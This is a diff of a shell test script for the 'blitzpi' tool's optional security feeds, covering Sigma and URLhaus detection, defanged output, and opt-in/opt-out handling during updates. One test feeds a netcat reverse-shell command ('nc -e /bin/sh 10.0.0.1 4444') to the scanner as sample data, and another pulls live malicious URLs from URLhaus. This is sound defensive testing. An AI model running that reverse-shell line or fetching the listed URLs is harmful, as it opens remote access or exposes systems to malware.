@@ -33,13 +33,19 @@ FS="$("$SHIM" feeds status </dev/null 2>&1)"; printf '%s' "$FS" | grep -q "NOT o
 [ -f "$HOME/.blitz/feeds/commands/rules.json" ] && ok "opt-in also installed the commands feed (Sigma, $(grep -o '"rules":[0-9]*' "$HOME/.blitz/feeds/commands/manifest.json"))" || no "commands feed missing"
 "$SHIM" feeds scan 'nc -e /bin/sh 10.0.0.1 4444' </dev/null 2>&1 | grep -q "Netcat Reverse Shell" && ok "feeds scan flags a reverse shell (Sigma)" || no "Sigma scan missed the reverse shell"
 [ -f "$HOME/.blitz/feeds/urls/rules.json" ] && ok "opt-in also installed the urls feed (URLhaus, $(grep -o '"rules":[0-9]*' "$HOME/.blitz/feeds/urls/manifest.json") URLs)" || no "urls feed missing"
-LISTED="$(curl -fsSL https://urlhaus.abuse.ch/downloads/text_online/ | grep -v '^#' | grep -v -i github | head -1)"
-"$SHIM" feeds scan "echo $LISTED" </dev/null 2>&1 | grep -q "hxxp" && ok "feeds scan flags a listed URL and prints it defanged" || no "URL scan missed the listed URL or printed it in clear"
-HOSTPART="$(printf '%s' "$LISTED" | sed -E 's#^[a-z]+://##; s#[/:].*##')"
-grep -rq -- "$HOSTPART" "$HOME/.blitz/feeds/" && no "the listed host appears in clear text under ~/.blitz/feeds (antivirus bait)" || ok "nothing under ~/.blitz/feeds carries a listed URL in clear (hashed, no raw source)"
+# the list is newest-first and grows by the minute; the feed was fetched a moment ago, so test the OLDEST entries
+LISTED=""; for u in $(curl -fsSL https://urlhaus.abuse.ch/downloads/text_online/ | tr -d '\r' | grep -v '^#' | grep -v -i github | grep -E '^https?://[A-Za-z0-9.:/_-]+$' | tail -8); do
+  if "$SHIM" feeds scan "echo $u" </dev/null 2>&1 | grep -q "hxxp"; then LISTED="$u"; break; fi
+done
+[ -n "$LISTED" ] && ok "feeds scan flags a listed URL and prints it defanged" || { no "URL scan flagged none of the oldest listed entries"; echo "    candidates tried: $(curl -fsSL https://urlhaus.abuse.ch/downloads/text_online/ | tr -d '\r' | grep -v '^#' | grep -v -i github | grep -E '^https?://[A-Za-z0-9.:/_-]+$' | tail -8 | wc -l)"; echo "    scan says: $("$SHIM" feeds scan "echo ${u:-none}" </dev/null 2>&1 | head -3)"; echo "    list says: $("$SHIM" feeds list </dev/null 2>&1 | grep -A1 '^  urls')"; }
+if [ -n "$LISTED" ]; then
+  HOSTPART="$(printf '%s' "$LISTED" | sed -E 's#^[a-z]+://##; s#[/:].*##')"
+  grep -rq -- "$HOSTPART" "$HOME/.blitz/feeds/" && no "the listed host appears in clear text under ~/.blitz/feeds (antivirus bait)" || ok "nothing under ~/.blitz/feeds carries a listed URL in clear (hashed, no raw source)"
+else no "clear-text check skipped (no listed URL found)"; fi
 [ -e "$HOME/.blitz/feeds/urls/source.raw" ] && no "raw URL list kept on disk" || ok "raw source not retained"
 "$SHIM" feeds scan 'curl https://raw.githubusercontent.com/oven-sh/bun/main/README.md' </dev/null 2>&1 | grep -q "nothing flagged" && ok "a GitHub raw URL is not host-blocked (shared platform)" || no "shared platform host was flagged"
-"$SHIM" feeds opt-out </dev/null >/dev/null 2>&1 && [ ! -e "$HOME/.blitz/feeds/opt-in" ] && [ -f "$HOME/.blitz/feeds/secrets/rules.json" ] && ok "opt-out keeps files, drops consent" || no "opt-out state wrong"
+"$SHIM" feeds opt-out </dev/null >/dev/null 2>&1 && [ ! -e "$HOME/.blitz/feeds/opt-in" ] && [ -f "$HOME/.blitz/feeds/opt-out" ] && [ -f "$HOME/.blitz/feeds/secrets/rules.json" ] && ok "opt-out keeps files, drops consent, records the decision" || no "opt-out state wrong"
+rm -f "$HOME/.blitz/feeds/opt-out"   # back to undecided for the update tests below
 
 echo "== run it (no PATH, no bun on PATH, from a foreign cwd)"
 D="$(mktemp -d)"; V="$(cd "$D" && env -i HOME="$HOME" PATH=/usr/bin:/bin "$SHIM" --version </dev/null 2>&1)"
@@ -55,8 +61,11 @@ echo "== update to the same local source (installs a second copy, switches curre
 SRC2="$(mktemp -d)"; (cd "$ROOT" && tar --exclude=./node_modules --exclude=./.git --exclude=./runs -cf - .) | tar -C "$SRC2" -xf -
 sed -i.bak 's/"version": "\([0-9.]*\)"/"version": "\1-next"/' "$SRC2/package.json" && rm -f "$SRC2/package.json.bak"
 BLITZPI_SOURCE="$SRC2" "$SHIM" update --no-feeds >"$HOME/update.log" 2>&1 && ok "blitzpi update --no-feeds exit 0" || { no "update failed"; tail -20 "$HOME/update.log"; }
-grep -q "Security feeds (optional)" "$HOME/update.log" && no "update re-offered feeds although not opted in" || ok "update did not nag about feeds (not opted in)"
-touch "$HOME/.blitz/feeds/opt-in"
+grep -q "Security feeds (optional)" "$HOME/update.log" && ok "update offers the feeds while undecided" || no "update stayed silent on an undecided machine"
+[ -f "$HOME/.blitz/feeds/opt-out" ] && ok "--no-feeds recorded an explicit opt-out" || no "opt-out not recorded"
+BLITZPI_SOURCE="$SRC2" "$SHIM" update >"$HOME/update-declined.log" 2>&1; grep -q "declined earlier" "$HOME/update-declined.log" && ok "after an explicit no, update does not nag" || no "nagged after opt-out: $(grep -i feeds "$HOME/update-declined.log" | head -2)"
+FS2="$("$SHIM" feeds status </dev/null 2>&1)"; printf '%s' "$FS2" | grep -q "declined" && ok "feeds status says declined" || no "feeds status: $FS2"
+rm -f "$HOME/.blitz/feeds/opt-out"; touch "$HOME/.blitz/feeds/opt-in"
 BLITZPI_SOURCE="$SRC2" "$SHIM" update --no-feeds >"$HOME/update2.log" 2>&1 && grep -q "left as they are" "$HOME/update2.log" && ok "update --no-feeds leaves installed feeds alone (platform still updated)" || { no "update --no-feeds"; tail -5 "$HOME/update2.log"; }
 BLITZPI_SOURCE="$SRC2" "$SHIM" update --feeds >"$HOME/update3.log" 2>&1 && grep -qE "secrets +(updated|unchanged)" "$HOME/update3.log" && ok "update --feeds refreshes feeds after the platform" || { no "update --feeds"; tail -5 "$HOME/update3.log"; }
 readlink "$APP/current" | grep -q -- "-next" && ok "current switched to $(readlink "$APP/current")" || no "current not switched: $(readlink "$APP/current")"
